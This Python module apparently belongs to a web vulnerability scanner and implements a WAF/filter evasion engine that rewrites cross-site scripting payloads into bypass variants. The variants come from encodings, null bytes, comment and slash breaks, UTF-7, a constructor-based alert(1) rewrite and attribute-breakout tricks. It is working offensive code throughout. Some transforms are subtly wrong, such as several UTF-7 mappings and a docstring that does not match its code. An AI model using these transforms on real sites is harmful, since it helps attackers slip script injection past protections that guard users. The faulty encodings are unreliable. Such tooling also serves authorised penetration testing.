"""WAF/Filter evasion transformation engine.

Each transform is a pure function str -> str. The engine (see core/scanner.py)
applies one or a small combination of transforms to a base payload to generate
bypass variants. Keeping transforms as isolated primitives makes the corpus
independent of evasion tricks and lets the engine adapt to observed blocks.
"""
from __future__ import annotations

import re


# ---------------------------------------------------------------------------
# Individual transform families
# ---------------------------------------------------------------------------

def t_mixed_case(s: str) -> str:
    """Randomize letter case (preserves non-letters). Deterministic-ish."""
    out = []
    for i, ch in enumerate(s):
        if ch.isalpha():
            out.append(ch.upper() if i % 2 == 0 else ch.lower())
        else:
            out.append(ch)
    return "".join(out)


def t_upper(s: str) -> str:
    return s.upper()


def t_html_entity_decimal(s: str) -> str:
    """Encode every char as &#<dec>;"""
    return "".join(f"&#{ord(c)};" for c in s)


def t_html_entity_hex(s: str) -> str:
    return "".join(f"&#x{ord(c):x};" for c in s)


def t_html_entity_named(s: str) -> str:
    """Encode only chars that have a named entity equivalent."""
    named = {
        '"': "&quot;", "'": "&apos;", "&": "&amp;", "<": "&lt;", ">": "&gt;",
        "/": "&#x2F;", " ": "&nbsp;", "(": "&#40;", ")": "&#41;",
    }
    return "".join(named.get(c, c) for c in s)


def t_url_encode_all(s: str) -> str:
    return "".join(f"%{ord(c):02X}" for c in s)


def t_url_encode_spaces_and_quotes(s: str) -> str:
    rep = {' ': "%20", '"': "%22", "'": "%27", "<": "%3C", ">": "%3E",
           "(": "%28", ")": "%29", "#": "%23", "&": "%26", "/": "%2F"}
    return "".join(rep.get(c, c) for c in s)


def t_double_url_encode(s: str) -> str:
    """Percent-encode, then encode the percent signs again."""
    once = "".join(f"%{ord(c):02X}" for c in s)
    return once.replace("%", "%25")


def t_null_byte(s: str) -> str:
    """Insert a URL-encoded null byte before risky chars."""
    out = []
    for c in s:
        if c in "<>/'\"":
            out.append("%00" + c)
        else:
            out.append(c)
    return "".join(out)


def t_tab_break(s: str) -> str:
    """Insert tabs between tag/attr tokens to confuse naive filters."""
    s = re.sub(r"(<)([a-zA-Z])", r"\1\t\2", s)
    s = re.sub(r"(</)([a-zA-Z])", r"\1\t\2", s)
    s = re.sub(r"(\s)(on)([a-zA-Z]+)", r"\1\t\2\3", s)
    return s


def t_newline_break(s: str) -> str:
    s = re.sub(r"(<)([a-zA-Z])", r"\1\n\2", s)
    s = re.sub(r"(\s)(on)([a-zA-Z]+)", r"\1\n\2\3", s)
    return s


def t_comment_break(s: str) -> str:
    """Insert /* */ comments inside script/style keywords (JS context)."""
    s = s.replace("script", "scr" + "/**/" + "ipt")
    s = s.replace("alert", "ale" + "/*x*/" + "rt")
    return s


def t_slash_break(s: str) -> str:
    """Insert a slash between chars of tags, e.g. <script> -> <s/c/r/i/p/t>."""
    s = re.sub(r"<script", "<s/c/r/i/p/t", s, flags=re.I)
    s = re.sub(r"</script", "</s/c/r/i/p/t", s, flags=re.I)
    return s


def t_fullwidth(s: str) -> str:
    """Map ASCII letters/digits to Unicode fullwidth forms (some parsers normalize)."""
    out = []
    for c in s:
        o = ord(c)
        if 0x21 <= o <= 0x7E:
            out.append(chr(o - 0x21 + 0xFF01))
        else:
            out.append(c)
    return "".join(out)


def t_fromcharcode(s: str) -> str:
    """Wrap a string literal's content in String.fromCharCode for JS contexts."""
    m = re.search(r"alert\((['\"]?)(.*?)\1\)", s)
    if m:
        inner = m.group(2)
        enc = ",".join(str(ord(c)) for c in inner)
        return s[:m.start()] + f"alert(String.fromCharCode({enc}))" + s[m.end():]
    return s


def t_obfuscate_alert(s: str) -> str:
    """Replace alert(1) with eval(String.fromCharCode(...)) style call."""
    if "alert(1)" in s:
        return s.replace("alert(1)", "eval('al'+'ert')(1)")
    return s


def t_constructor_escape(s: str) -> str:
    """Turn alert(1) into a constructor-based call to dodge the keyword."""
    if "alert(1)" in s:
        return s.replace("alert(1)", "(this).constructor.constructor('alert(1)')()")
    return s


def t_interleave_nulls(s: str) -> str:
    """Insert a NUL byte between every character (some parsers skip NULs)."""
    return "\0".join(s) if s else s


def t_utf7(s: str) -> str:
    """UTF-7 encode angle brackets / quotes / parens. Old parsers that treat a
    page as UTF-7 (often via a reflected charset) decode this back to XSS."""
    table = {
        "<": "+ADw-", ">": "+AD4-", "'": "+ACY-", '"': "+ACI-",
        "(": "+ADs-", ")": "+AD0-", "&": "+ACY-", "/": "+AFw-",
        "\\": "+AFw-",
    }
    out = []
    for c in s:
        out.append(table.get(c, c))
    return "".join(out)


def t_js_unicode(s: str) -> str:
    """JS unicode-escape every char (\\uXXXX). Decoded by the JS engine inside
    script blocks / string literals but stays inert in raw HTML text."""
    return "".join(f"\\u{ord(c):04X}" for c in s)


def t_css_unicode(s: str) -> str:
    """CSS unicode-escape every char (\\XX). Decoded by the CSS engine inside
    style= attributes / <style> but inert in raw HTML text."""
    return "".join(f"\\{ord(c):02X}" if ord(c) < 0x100 else f"\\{ord(c):04X}"
                   for c in s)


_HTML5_ENTITIES = {
    "<": "&lt;", ">": "&gt;", "/": "&sol;", "\\": "&bsol;",
    "(": "&lpar;", ")": "&rpar;", "'": "&apos;", '"': "&quot;",
    "`": "&grave;", " ": "&Tab;", "\n": "&NewLine;", ":": "&colon;",
    "=": "&equals;", ";": "&semi;", "&": "&amp;",
}


def t_html5_entities(s: str) -> str:
    """Use HTML5 named-character-reference variants (&sol; &colon; &lpar; ...)
    that many naive string filters don't normalize."""
    return "".join(_HTML5_ENTITIES.get(c, c) for c in s)


def t_duplicate_attribute(s: str) -> str:
    """Duplicate-attribute divergence: if the payload is an attribute breakout
    like `\" autofocus onfocus=alert(1) x=\"`, emit a benign duplicate of the
    first attribute name so strict parsers (keeping the first) and lenient ones
    (keeping the last) diverge. Best-effort; no-op for non-attr payloads.

    The name is taken as the first token after the leading quote and must NOT
    be required to carry ``=``: boolean attributes (``autofocus``, ``disabled``,
    ``open``) legitimately appear bare, and ``" autofocus onfocus=alert(1) x="``
    is one of the most common breakout shapes in the wild.  The old pattern
    demanded a trailing ``=`` and therefore silently no-op'd on exactly those
    payloads.
    """
    m = re.match(r'^\s*"\s*([a-zA-Z_:][\w:.\-]*)', s)
    if not m:
        return s
    name = m.group(1)
    return f' {name}=""' + s


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------

REGISTRY = {
    "mixed_case": t_mixed_case,
    "upper": t_upper,
    "html_entity_decimal": t_html_entity_decimal,
    "html_entity_hex": t_html_entity_hex,
    "html_entity_named": t_html_entity_named,
    "url_encode_all": t_url_encode_all,
    "url_encode_selective": t_url_encode_spaces_and_quotes,
    "double_url_encode": t_double_url_encode,
    "null_byte": t_null_byte,
    "tab_break": t_tab_break,
    "newline_break": t_newline_break,
    "comment_break": t_comment_break,
    "slash_break": t_slash_break,
    "fullwidth": t_fullwidth,
    "fromcharcode": t_fromcharcode,
    "obfuscate_alert": t_obfuscate_alert,
    "constructor_escape": t_constructor_escape,
    "interleave_nulls": t_interleave_nulls,
    "utf7": t_utf7,
    "js_unicode": t_js_unicode,
    "css_unicode": t_css_unicode,
    "html5_entities": t_html5_entities,
    "duplicate_attribute": t_duplicate_attribute,
}

# Transforms that are context-safe to combine (avoid double-encoding collisions).
COMBINABLE = [
    "mixed_case", "html_entity_named", "tab_break", "newline_break",
    "comment_break", "slash_break", "null_byte", "constructor_escape",
]


def apply(name: str, payload: str) -> str:
    fn = REGISTRY.get(name)
    if fn is None:
        return payload
    try:
        return fn(payload)
    except Exception:
        return payload


def available() -> list[str]:
    return list(REGISTRY.keys())
